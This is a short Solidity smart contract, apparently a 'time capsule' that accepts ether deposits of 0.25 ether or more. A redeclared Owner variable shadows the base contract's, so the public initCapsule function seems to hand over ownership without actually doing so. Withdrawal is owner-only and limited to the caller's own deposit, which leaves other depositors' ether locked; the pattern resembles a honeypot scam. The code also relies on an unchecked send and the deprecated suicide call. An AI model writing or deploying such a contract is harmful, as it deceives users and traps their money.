1 pragma solidity ^0.4.17;
2 
3 contract Ownable {
4     address public Owner;
5     
6     function Ownable() { Owner = msg.sender; }
7 
8     modifier onlyOwner() {
9         if( Owner == msg.sender )
10             _;
11     }
12     
13     function transferOwner(address _owner) onlyOwner {
14         if( this.balance == 0 ) {
15             Owner = _owner;
16         }
17     }
18 }
19 
20 contract TimeCapsuleEvent is Ownable {
21     address public Owner;
22     mapping (address=>uint) public deposits;
23     uint public openDate;
24     
25     event Initialized(address indexed owner, uint openOn);
26     
27     function initCapsule(uint open) {
28         Owner = msg.sender;
29         openDate = open;
30         Initialized(Owner, openDate);
31     }
32 
33     event Deposit(address indexed depositor, uint amount);
34     event Withdrawal(address indexed withdrawer, uint amount);
35 
36     function() payable { deposit(); }
37     
38     function deposit() payable {
39         if( msg.value >= 0.25 ether ) {
40             deposits[msg.sender] += msg.value;
41             Deposit(msg.sender, msg.value);
42         } else throw;
43     }
44     
45     function withdraw(uint amount) onlyOwner {
46         if( now >= openDate ) {
47             uint max = deposits[msg.sender];
48             if( amount <= max && max > 0 ) {
49                 msg.sender.send( amount );
50                 Withdrawal(msg.sender, amount);
51             }
52         }
53     }
54 
55     function kill() onlyOwner {
56         if( this.balance == 0 )
57             suicide( msg.sender );
58 	}
59 }